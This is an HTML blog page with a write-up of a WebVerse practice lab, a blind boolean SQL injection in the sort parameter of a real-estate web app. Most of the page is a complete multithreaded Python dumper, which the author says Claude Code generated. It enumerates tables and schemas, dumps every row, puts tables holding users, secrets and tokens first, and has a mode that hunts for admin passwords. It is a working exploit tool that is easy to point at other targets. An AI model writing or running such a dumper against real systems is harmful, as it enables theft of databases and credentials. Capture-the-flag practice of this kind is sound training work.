@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;utf8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 64 64%27><rect width=%2764%27 height=%2764%27 rx=%2712%27 fill=%27%2306080f%27/><path d=%27M16 18L30 32L16 46%27 stroke=%27%2300d9ff%27 stroke-width=%276%27 fill=%27none%27 stroke-linecap=%27round%27 stroke-linejoin=%27round%27/><rect x=%2734%27 y=%2742%27 width=%2716%27 height=%276%27 rx=%272%27 fill=%27%2300ff9d%27/></svg>">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- EDIT: page title shown in browser tab -->
+    <title>Parcel (SQLi) Writeup // 7s26simon</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=JetBrains+Mono:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="../css/style.css">
+    <link rel="stylesheet" type="text/css" href="../css/style-writeup.css">
+</head>
+
+<body>
+
+    <!-- Imported from Medium: https://medium.com/@7s26simon/parcel-sqli-webverse-writeup-973170ad0161 -->
+
+    <header id="top-bar-blue">
+        <h1 id="name-font">Simon McCabe</h1>
+        <p class="certs">OSCP &middot; OSWP &middot; PWPP &middot; PWPA &middot; PAPA &middot; EnCE &middot; Linux+ &middot; LPIC-1 &middot; Network+ &middot; Security+ &middot; Pentest+ &middot; eJPT &middot; eWPT &middot; BSc &middot; PGCert</p>
+    </header>
+
+    <nav class="topnav">
+        <a href="../index.html">home</a>
+        <div class="topnav-dropdown active">
+            <a href="#" class="topnav-dropdown-toggle" aria-haspopup="true">writeups</a>
+            <div class="topnav-dropdown-menu" role="menu">
+                <a href="../hackthebox.html">hackthebox</a>
+                <a href="../tryhackme.html">tryhackme</a>
+                <a href="../vulnhub.html">vulnhub</a>
+                <a href="../bugforge.html">bugforge</a>
+                <a class="active" href="../webverse.html">webverse</a>
+            </div>
+        </div>
+        <a href="../general.html">blog</a>
+        <a href="../quicklinks.html">quick links</a>
+        <a href="../About.html">about</a>
+    </nav>
+
+    <!-- ===== Title block ===== -->
+    <div id="writeup-box-name">
+        <p>Parcel (SQLi) Writeup</p>
+    </div>
+
+    <div id="marg-asthetic">
+
+<hr/><figure><img src="images/parcel-sqli-writeup/1*2YxzgZcZGI-Atl3_AeVqOg.png"/></figure><p>Lab can be found at: <a href="https://webverselabs-pro.com/">https://webverselabs-pro.com/</a></p><p>I thought this lab was “hard”. Despite being listed as easy, this lab really, really makes you work for it. Essentially, the description of the lab lets you know that the aim of the game is SQLi. So, I started the lab and began to hunt.</p><p>Gridmark is a Real Estate Market webapp which lets you look for properties and perform searches, save favourites etc.</p><figure><img src="images/parcel-sqli-writeup/1*2NWL4zumQLLE8JjoOBq6rA.png"/></figure><p>I looked around the app for a place I could inject SQL. The “Search” feature seemed the most obvious place.</p><figure><img src="images/parcel-sqli-writeup/1*ge-ECqGegX3UT25xKIG78A.png"/></figure><p>When you performed a search, it would look like this:</p><figure><img src="images/parcel-sqli-writeup/1*TH2ZPhphjPO2wSMviPBQhw.png"/></figure><p>I spent a long, long while trying to see if I could get SQLi here. I couldn’t. And that’s because I returned to the page and realised there was another option I needed to add. sort. You could sort results on the page:</p><figure><img src="images/parcel-sqli-writeup/1*J_ETYeU0bo9NjlHdTzLzxg.png"/></figure><p>Now, this type of SQLi was getting out of my depth. This isn’t your standard 1=1 payload (well, sort of). This is a blind boolean in the ORDER BY clause.</p><p>By blind, we mean that the application doesn’t reflect any SQL output back in the response. As an attacker, we never see the actual extracted values in an error message, HTML, or JSON etc.</p><p>By boolean, we mean we evaluate the response via a true/false query, not a timing delay. In short: does the response look like “19 results found” (TRUE) or “0 results found” (FALSE)? Then we fire queries and get some information back per HTTP request, which we can use to further the attack.</p><p>My first payload was:</p><pre class="code-view-two">GET /search?q=&amp;type=house&amp;min_price=100000&amp;max_price=10000000&amp;bedrooms=&amp;sort=(CASE%20WHEN%20(SELECT%20sqlite_version())%20IS%20NOT%20NULL%20THEN%20price%20ELSE%20id%20END)</pre><figure><img src="images/parcel-sqli-writeup/1*5GowYpSMKR6j35xIelHqOw.png"/></figure><p>The SQL CASE command is a boolean-based blind injection technique we can use to attempt to call a SQLite function to confirm if the backend DB is indeed using SQLite.</p><p>“IS NOT NULL” means that if SQLite is running, the function returns a string so the condition is TRUE.</p><p>“THEN price” means that if the condition is true, sort results by price</p><p>and ELSE id means that if the condition is false, sort by id.</p><p>With this, I got 19 results:</p><figure><img src="images/parcel-sqli-writeup/1*NYI6cFS5yeFK7vZCxvN-uQ.png"/></figure><p>To confirm we had something, I then used:</p><pre class="code-view-two">GET /search?q=&amp;type=house&amp;min_price=100000&amp;max_price=10000000&amp;bedrooms=&amp;sort=price%20LIMIT%20(CASE%20WHEN%20(1=2)%20THEN%2019%20ELSE%200%20END)-- HTTP/1.1</pre><p>This is a conditional expression:</p><ul><li><code>CASE WHEN (1=2)</code>Tests if 1 equals 2 (always false)</li><li><code>THEN 19</code> If true, return 19</li><li><code>ELSE 0 </code>If false, return 0</li><li>Result: Always evaluates to <code>0</code></li><li>So the LIMIT becomes <code>LIMIT 0</code>, which returns no results</li></ul><p>This basically is a payload to see if we can return 0 results. If we can, then we’ll know our injection worked. Spoiler: it worked and we got 0 results found:</p><figure><img src="images/parcel-sqli-writeup/1*EFw2OSCuPfLVievN44flEA.png"/></figure><p>Now here’s when things got tricky and I think this is a hard lab. SQLmap couldn’t get anywhere. No matter what I tried, it failed. Now, admittedly, I could have continued trying and maybe got somewhere, but I figured I’d “join the dark side” and do what most people would do in this scenario, I told Claude Code what my situation was, what I’d tried and told it to generate a script to dump the DB.</p><p>It came back with a HUGE, HUGE script. And then I got to work, dumping the DB. I’ll save you the hassle because it took me a long….LONG time.</p><p>The flag was hiding in the platform_config table. So if you download the script below, change the session cookie to match your own and run the following:</p><pre class="code-view-two">python3 flaghunter.py query "SELECT value FROM platform_config WHERE key='PLATFORM_API_LICENSE_KEY'"</pre><p>you’ll get the flag within a matter of seconds 8.2 seconds to be precise:</p><figure><img src="images/parcel-sqli-writeup/1*RGVDmXHBdlvK0aicSAIuXQ.png"/></figure><p>If you wish to dump the table for fun, you can, but I did it so you don’t have to. There’s really not much point because it takes a long, long time and there’s nothing too juicy in there.</p><figure><img src="images/parcel-sqli-writeup/1*motGNgyWv9iqNZc8dxe5QQ.png"/></figure><p>Python3 code is here if you wish to use it to grab the flag:</p><pre class="code-view-two"> #!/usr/bin/env python3
+"""
+GridMark boolean-blind SQL injection dumper — fast edition.
+
+Speedups vs v1:
+- ThreadPoolExecutor for parallel probes (default 15 workers)
+- Prefix confirmation: verify a known prefix in O(prefix_len) requests
+  instead of O(prefix_len * log2(charset)) blind-searching it
+- find-admin command: scan a table for a password with known prefix
+
+Usage:
+    python3 gridmark_dump.py tables
+    python3 gridmark_dump.py schema users
+    python3 gridmark_dump.py dump users email,password
+    python3 gridmark_dump.py query "SELECT email FROM users LIMIT 1"
+
+    # find account whose password starts with WEBVERSE and dump full row
+    python3 gridmark_dump.py find-admin users email,password WEBVERSE
+
+    # dump EVERYTHING - auto-discovers schemas and dumps every row of every table
+    python3 gridmark_dump.py dump-all
+    python3 gridmark_dump.py dump-all activity_log,listings   # skip big tables
+"""
+
+import sys
+import urllib.parse
+import urllib.request
+import urllib.error
+import threading
+import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# ---------- config ----------
+BASE = "http://app.gridmark.io"
+# REPLACE THE SESSION ID WITH YOUR OWN SESSION TOKEN
+COOKIE = "session=&lt;token here e.g .eJW....&gt;"
+TRUE_THRESHOLD = 30000
+WORKERS = 15
+REQUEST_TIMEOUT = 15
+
+_probe_count = 0
+_probe_lock = threading.Lock()
+
+
+def _bump():
+    global _probe_count
+    with _probe_lock:
+        _probe_count += 1
+
+
+def probe(sql_condition: str) -&gt; bool:
+    """Boolean-blind oracle via page-size delta."""
+    payload = f"price LIMIT (CASE WHEN ({sql_condition}) THEN 19 ELSE 0 END)--"
+    params = {
+        "q": "", "type": "house",
+        "min_price": "100000", "max_price": "10000000",
+        "bedrooms": "", "sort": payload,
+    }
+    url = f"{BASE}/search?" + urllib.parse.urlencode(params, safe="")
+    req = urllib.request.Request(url, headers={"Cookie": COOKIE})
+    for attempt in range(3):
+        try:
+            with urllib.request.urlopen(req, timeout=REQUEST_TIMEOUT) as resp:
+                body = resp.read()
+            _bump()
+            return len(body) &gt; TRUE_THRESHOLD
+        except (urllib.error.URLError, TimeoutError):
+            if attempt == 2:
+                raise
+            time.sleep(0.5 * (attempt + 1))
+
+
+def extract_length(expr: str, max_len: int = 512) -&gt; int:
+    lo, hi = 0, 1
+    while hi &lt; max_len and probe(f"length({expr})&gt;{hi}"):
+        lo, hi = hi, min(hi * 2, max_len)
+    while lo &lt; hi:
+        mid = (lo + hi + 1) // 2
+        if probe(f"length({expr})&gt;={mid}"):
+            lo = mid
+        else:
+            hi = mid - 1
+    return lo
+
+
+def extract_char(expr: str, pos: int) -&gt; str:
+    lo, hi = 32, 126
+    while lo &lt; hi:
+        mid = (lo + hi) // 2
+        if probe(f"unicode(substr({expr},{pos},1))&gt;{mid}"):
+            lo = mid + 1
+        else:
+            hi = mid
+    return chr(lo)
+
+
+def verify_prefix(expr: str, prefix: str) -&gt; bool:
+    """Costs len(prefix) requests — much cheaper than full blind search."""
+    for i, c in enumerate(prefix, start=1):
+        if not probe(f"unicode(substr({expr},{i},1))={ord(c)}"):
+            return False
+    return True
+
+
+def extract_range_parallel(expr: str, start: int, end: int, workers: int = WORKERS) -&gt; str:
+    result = [""] * (end - start + 1)
+    with ThreadPoolExecutor(max_workers=workers) as ex:
+        futures = {ex.submit(extract_char, expr, i): i for i in range(start, end + 1)}
+        for fut in as_completed(futures):
+            i = futures[fut]
+            result[i - start] = fut.result()
+            done = sum(1 for x in result if x)
+            sys.stdout.write(f"
+  extracting... {done}/{len(result)}")
+            sys.stdout.flush()
+    print()
+    return "".join(result)
+
+
+def extract_string(expr: str, known_prefix: str = "") -&gt; str:
+    n = extract_length(expr)
+    print(f"  [length: {n}]")
+    if n == 0:
+        return ""
+    if known_prefix:
+        if len(known_prefix) &gt; n:
+            print(f"  [prefix too long for value]")
+            return ""
+        print(f"  verifying prefix '{known_prefix}'...")
+        if not verify_prefix(expr, known_prefix):
+            print(f"  [prefix '{known_prefix}' NOT present]")
+            return ""
+        print(f"  [prefix confirmed]")
+        if len(known_prefix) == n:
+            return known_prefix
+        tail = extract_range_parallel(expr, len(known_prefix) + 1, n)
+        return known_prefix + tail
+    return extract_range_parallel(expr, 1, n)
+
+
+def count_rows(table: str, where: str = "") -&gt; int:
+    w = f" WHERE {where}" if where else ""
+    expr = f"(SELECT count(*) FROM {table}{w})"
+    lo, hi = 0, 1
+    while probe(f"{expr}&gt;{hi}"):
+        lo, hi = hi, hi * 2
+    while lo &lt; hi:
+        mid = (lo + hi + 1) // 2
+        if probe(f"{expr}&gt;={mid}"):
+            lo = mid
+        else:
+            hi = mid - 1
+    return lo
+
+
+def cmd_tables():
+    expr = "(SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table')"
+    print("[*] Dumping table names...")
+    t0 = time.time()
+    tables = extract_string(expr)
+    print(f"
+[+] Tables: {tables.split('|')}")
+    print(f"[stats] {_probe_count} probes, {time.time()-t0:.1f}s")
+
+
+def cmd_schema(table: str):
+    expr = f"(SELECT sql FROM sqlite_master WHERE type='table' AND name='{table}')"
+    print(f"[*] Dumping schema for '{table}'...")
+    t0 = time.time()
+    schema = extract_string(expr)
+    print(f"
+[+] Schema:
+{schema}")
+    print(f"[stats] {_probe_count} probes, {time.time()-t0:.1f}s")
+
+
+def cmd_dump(table: str, cols: str):
+    count = count_rows(table)
+    print(f"[*] {count} rows in '{table}'. Dumping [{cols}]...")
+    col_list = [c.strip() for c in cols.split(",")]
+    concat = "||char(124)||".join(col_list)
+    t0 = time.time()
+    for row_idx in range(count):
+        expr = f"(SELECT {concat} FROM {table} LIMIT 1 OFFSET {row_idx})"
+        print(f"
+[row {row_idx}]")
+        val = extract_string(expr)
+        fields = val.split("|")
+        for name, v in zip(col_list, fields):
+            print(f"  {name}: {v}")
+    print(f"
+[stats] {_probe_count} probes, {time.time()-t0:.1f}s")
+
+
+def cmd_find_admin(table: str, cols: str, password_prefix: str):
+    """
+    Scan rows of `table` for a password (last col in `cols`) starting with
+    `password_prefix`. On match, dump the full row.
+
+    Fast path: one SQL query using LIKE to find the matching row's offset,
+    then extract that single row.
+    """
+    col_list = [c.strip() for c in cols.split(",")]
+    pw_col = col_list[-1]
+    t0 = time.time()
+
+    # Fast path: ask the DB directly via LIKE. Single count + single row dump.
+    # Using char() to avoid single quotes in the literal.
+    prefix_sql = "||".join(f"char({ord(c)})" for c in password_prefix)
+    where = f"{pw_col} LIKE {prefix_sql}||char(37)"  # char(37) = '%'
+
+    n = count_rows(table, where)
+    print(f"[*] {n} row(s) in '{table}' with {pw_col} LIKE '{password_prefix}%'")
+    if n == 0:
+        print("[-] no match")
+        print(f"[stats] {_probe_count} probes, {time.time()-t0:.1f}s")
+        return
+
+    concat = "||char(124)||".join(col_list)
+    for row_idx in range(n):
+        expr = f"(SELECT {concat} FROM {table} WHERE {where} LIMIT 1 OFFSET {row_idx})"
+        print(f"
+[match {row_idx}]")
+        val = extract_string(expr, known_prefix="")
+        # split and present
+        fields = val.split("|")
+        for name, v in zip(col_list, fields):
+            print(f"  {name}: {v}")
+    print(f"
+[stats] {_probe_count} probes, {time.time()-t0:.1f}s")
+
+
+def _parse_columns_from_schema(schema: str) -&gt; list:
+    """Extract column names from a CREATE TABLE ... SQL string."""
+    import re
+    # grab everything between the outermost parens
+    m = re.search(r"\((.*)\)", schema, flags=re.DOTALL)
+    if not m:
+        return []
+    inner = m.group(1)
+    # split on top-level commas (ignore commas inside parens)
+    cols, depth, buf = [], 0, ""
+    for ch in inner:
+        if ch == "(":
+            depth += 1
+        elif ch == ")":
+            depth -= 1
+        if ch == "," and depth == 0:
+            cols.append(buf.strip())
+            buf = ""
+        else:
+            buf += ch
+    if buf.strip():
+        cols.append(buf.strip())
+    # first token of each clause is the col name; skip constraint clauses
+    names = []
+    for c in cols:
+        first = c.split()[0].strip('"`[]')
+        if first.upper() in ("PRIMARY", "UNIQUE", "CHECK", "FOREIGN", "CONSTRAINT"):
+            continue
+        names.append(first)
+    return names
+
+
+def cmd_dump_all(skip_tables: str = ""):
+    """
+    Discover every user table, extract its schema, then dump every row of every
+    column. Skips sqlite_* internal tables.
+    """
+    skip = set(s.strip() for s in skip_tables.split(",") if s.strip())
+    skip.add("sqlite_sequence")  # always skip
+
+    t0 = time.time()
+    print("[*] Phase 1: enumerating tables...")
+    tables_expr = "(SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')"
+    tables_str = extract_string(tables_expr)
+    tables = [t for t in tables_str.split("|") if t and t not in skip]
+    print(f"[+] Tables to dump ({len(tables)}): {tables}")
+
+    # prioritize interesting tables first
+    priority = ("user", "auth", "account", "admin", "config", "secret", "token", "key", "flag")
+    tables.sort(key=lambda t: (
+        0 if any(p in t.lower() for p in priority) else 1,
+        t
+    ))
+    print(f"[*] Dump order: {tables}")
+
+    for table in tables:
+        print(f"
+{'='*60}
+[*] TABLE: {table}
+{'='*60}")
+        schema_expr = f"(SELECT sql FROM sqlite_master WHERE type='table' AND name='{table}')"
+        schema = extract_string(schema_expr)
+        print(f"[schema] {schema}")
+
+        cols = _parse_columns_from_schema(schema)
+        if not cols:
+            print(f"[!] could not parse columns for {table}, skipping")
+            continue
+        print(f"[cols] {cols}")
+
+        n = count_rows(table)
+        print(f"[rows] {n}")
+        if n == 0:
+            continue
+
+        concat = "||char(124)||".join(cols)
+        for row_idx in range(n):
+            expr = f"(SELECT {concat} FROM {table} LIMIT 1 OFFSET {row_idx})"
+            print(f"
+--- {table}[{row_idx}] ---")
+            val = extract_string(expr)
+            fields = val.split("|")
+            for name, v in zip(cols, fields):
+                print(f"  {name}: {v}")
+        print(f"
+[cumulative] {_probe_count} probes, {time.time()-t0:.1f}s")
+
+    print(f"
+{'='*60}
+[DONE] {_probe_count} total probes, {time.time()-t0:.1f}s
+{'='*60}")
+
+
+def cmd_query(q: str):
+    expr = f"({q})"
+    print(f"[*] Running: {q}")
+    t0 = time.time()
+    val = extract_string(expr)
+    print(f"
+[+] Result: {val}")
+    print(f"[stats] {_probe_count} probes, {time.time()-t0:.1f}s")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) &lt; 2:
+        print(__doc__)
+        sys.exit(1)
+    mode = sys.argv[1]
+    try:
+        if mode == "tables":
+            cmd_tables()
+        elif mode == "schema" and len(sys.argv) &gt;= 3:
+            cmd_schema(sys.argv[2])
+        elif mode == "dump" and len(sys.argv) &gt;= 4:
+            cmd_dump(sys.argv[2], sys.argv[3])
+        elif mode == "find-admin" and len(sys.argv) &gt;= 5:
+            cmd_find_admin(sys.argv[2], sys.argv[3], sys.argv[4])
+        elif mode == "dump-all":
+            skip = sys.argv[2] if len(sys.argv) &gt;= 3 else ""
+            cmd_dump_all(skip)
+        elif mode == "query" and len(sys.argv) &gt;= 3:
+            cmd_query(sys.argv[2])
+        else:
+            print(__doc__)
+            sys.exit(1)
+    except KeyboardInterrupt:
+        print(f"
+[!] interrupted after {_probe_count} probes")
+        sys.exit(130)</pre><p>Thanks for reading!</p>
+
+    </div>
+
+    <section id="social-media">
+        <a class="logoWidth" href="https://www.linkedin.com/in/simonmccabe1/" target="_blank" rel="noopener" aria-label="LinkedIn"><img src="../images/linkedin.PNG" alt="LinkedIn"></a>
+        <a class="logoWidth" href="https://x.com/7s26simon" target="_blank" rel="noopener" aria-label="X / Twitter"><img src="../images/twitter.PNG" alt="X"></a>
+        <a class="logoWidth" href="https://www.youtube.com/@7s26simon" target="_blank" rel="noopener" aria-label="YouTube"><img src="../images/youtube.PNG" alt="YouTube"></a>
+        <a class="logoWidth" href="https://github.com/7s26simon" target="_blank" rel="noopener" aria-label="GitHub"><img src="../images/linkedin.PNG" alt="GitHub"></a>
+    </section>
+
+    <footer id="bottom-bar">
+        <div id="validator">
+            <p id="footerTag">© 2026 Simon McCabe &middot; 7s26simon.github.io</p>
+        </div>
+    </footer>
+
+</body>
+</html>
